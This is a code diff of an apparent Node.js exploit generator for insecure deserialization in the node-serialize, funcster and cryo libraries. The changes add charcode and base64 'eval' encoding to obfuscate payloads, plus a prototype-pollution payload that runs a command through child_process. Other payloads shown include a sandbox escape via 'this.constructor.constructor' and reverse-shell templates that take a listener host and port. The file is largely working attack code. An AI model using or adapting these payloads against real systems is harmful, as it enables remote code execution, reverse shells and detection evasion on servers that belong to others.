@@ -24,16 +24,18 @@ var argv = require('yargs')
     .alias('H', 'lhost')
     .alias('P', 'lport')
     .alias('t', 'target')
+    .alias('e', 'encode')
     .alias('p', 'cryoprototype')
     .alias('h', 'help')
-    .choices('s', [, 'ns', 'fstr', 'cryo'])
+	.choices('e', ['charcode', 'b64'])
+    .choices('s', ['ns', 'fstr', 'cryo'])
     .choices('m', ['serialize', 'deserialize'])
     .choices('v', ['rce', 'rshell'])
     .choices('t', ['linux', 'windows'])
     .default('t', 'windows')
 	.default('p', 'toString')
-    .default('s', 'ns')
     .default('m', 'serialize')
+    .default('e', 'charcode')
 	.describe('f','Input file')
     .describe('m','Operational mode, may be serialize or deserialize')
     .describe('s','The serializer module to use')
@@ -43,11 +45,30 @@ var argv = require('yargs')
     .describe('H','Local listener IP (-v rshell must be used)')
     .describe('P','Local listener PORT (-v rshell must be used)')
     .describe('t','Target machine OS, may be Win or Linux')
-    .demandOption(['f'])
+    .demandOption(['s'])
 	.showHelpOnFail(false, "Specify --help for available options")
     .argv;
 
 var payload;
+
+// Charcode Encode data
+function charencode(data){
+	var x = new Array();
+	for(var i=0; i < data.length; i++){
+		x.push(data.charCodeAt(i));
+	}
+	var encoded_data = "eval(String.fromCharCode(" + x.toString() + "))";
+	console.log(encoded_data);
+	return encoded_data;
+}
+
+// Charcode Encode data
+function b64encode(data){
+	var x = Buffer.from(data).toString('base64');
+	var encoded_data = "eval(Buffer.from('" + x.toString() + "','base64').toString('utf-8'))";
+	console.log(encoded_data);
+	return encoded_data;
+}
 
 // Serialize function wrap
 function serialize(serializer, object) {
@@ -82,6 +103,11 @@ lport_tag = /####LPORT####/g;
 shell_tag = /####SHELL####/g;
 sentinel_tag = /\/\/####SENTINEL####\s*}/g;
 proto_tag=/function_prototype/g;
+
+encoding_regex = /function\(\)\s*\{(.*);\s*\}\(\s+\)/g;
+encoding_prefix = /function\(\)\s*\{/g;
+encoding_suffix = /;\s*\}\(\s+\)/g;
+
 
 //BEGIN - Payload Template Generation
 if (argv.vector == "rshell" && argv.serializer != "cryo") {
@@ -156,7 +182,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
                         setTimeout(c(HOST, PORT), TIMEOUT);
                     });
                 }
-                c(HOST, PORT); //####SENTINEL####
+                c(HOST, PORT);//####SENTINEL####
             }
         }
     }
@@ -170,7 +196,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
             CMD = "####COMMAND####";
             require('child_process').exec(CMD, function(error, stdout, stderr) {
                 console.log(stdout)
-            }); //####SENTINEL####
+            });//####SENTINEL####
         },
     }
 } else if (argv.vector == "rce" && argv.serializer == "cryo") {
@@ -184,7 +210,17 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
                 CMD = "####COMMAND####";
                 require('child_process').exec(CMD, function(error, stdout, stderr) {
                     console.log(stdout)
-                }); //####SENTINEL####
+                });//####SENTINEL####
+            }
+        }
+    }
+} else if(argv.serializer == "cryo"){
+	payload = {
+        __proto: {
+            function_prototype: function() {
+                require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
+                    console.log(stdout)
+                });//####SENTINEL####
             }
         }
     }
@@ -193,7 +229,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
         rce: function() {
             require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
                 console.log(stdout)
-            }); //####SENTINEL####
+            });//####SENTINEL####
         },
     }
 }
@@ -222,15 +258,15 @@ if (argv.mode == "serialize") {
     }
 	// Making payload executable with "()"
 	if(serialized_object.includes("####SENTINEL####")){
-		serialized_object = serialized_object.replace(sentinel_tag, '}()');
+		serialized_object = serialized_object.replace(sentinel_tag, '}( )');
 	} else {
-		serialized_object = serialized_object.replace('"}}', '()"}}');
+		serialized_object = serialized_object.replace('"}}', '( )"}}');
 	}
 	if (argv.serializer == "fstr" || argv.serializer == "cryo") {
 		if(argv.serializer == "cryo"){
 			serialized_object = serialized_object.replace(proto_tag, argv.cryoprototype);
 		}
-        if (argv.vector == "rce") {
+        if (argv.vector == "rce" || typeof(argv.vector) == 'undefined') {
 			// Modifying RCE payload to bypass the sandbox via this.constructor.constructor
             serialized_object = serialized_object.replace("require('child_process')", "const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process')");
         } else if (argv.vector == "rshell") {
@@ -239,13 +275,31 @@ if (argv.mode == "serialize") {
             serialized_object = serialized_object.replace("var net = require('net');var spawn = require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");
         }
     }
+	
+	if (argv.encode){
+		console.log("[*] Encoding payload");
+		var p = encoding_regex.exec(serialized_object)[0];
+		p = p.replace(encoding_prefix, "");
+		p = p.replace(encoding_suffix, "");
+		if (argv.encode == "charcode"){
+			p = "function(){" + charencode(p) + ";}()";
+		} else if (argv.encode == "b64"){
+			p = "function(){" + b64encode(p) + ";}()";			
+		}
+		serialized_object = serialized_object.replace(encoding_regex, p );
+		
+	}
+	console.log('[+] Serializing payload');
+
+	if(argv.file){
+		fs.writeFile(argv.file, serialized_object, function(err) {
+			if (err) throw err;
+		});
+	}
 	// Debug check
     console.log(serialized_object);
 	// Storing on file
-    fs.writeFile(argv.file, serialized_object, function(err) {
-        if (err) throw err;
-        console.log('[+] Serializing payload');
-    });
+
 } else if (argv.mode == "deserialize") {
 	// Reading payload from file
     fs.readFile(argv.file, function(err, data) {
